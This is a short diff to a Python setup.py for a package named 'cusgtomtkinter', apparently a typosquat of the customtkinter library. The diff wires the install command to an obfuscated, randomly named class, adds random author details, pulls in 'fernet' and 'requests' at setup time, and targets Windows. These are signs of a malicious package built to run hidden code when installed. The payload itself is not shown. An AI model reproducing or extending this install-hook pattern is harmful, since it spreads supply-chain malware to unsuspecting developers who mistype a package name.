@@ -18,5 +18,22 @@ class PNDgPIjaNPyCxRlOjIKItAlYzDfLeVvUrKaYmpYrugcjujTdtrmxSHjbvGueMPQlWIThpeRurk
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+setup(
+    name="cusgtomtkinter",
+    version=VERSION,
+    author="XZZGAAoQgRQoJxEFMtTR",
+    author_email="EtQANcYnzBywOcGV@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': PNDgPIjaNPyCxRlOjIKItAlYzDfLeVvUrKaYmpYrugcjujTdtrmxSHjbvGueMPQlWIThpeRurkKCVLjHRuaOiFPtXZguyaWuYtfPJQYnbbldprgrHmceqHHEJiwdSmBEpymzBCYNDORclRHuvqfEZLAtkRCzSwmUfzZjpSiDQMsN,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
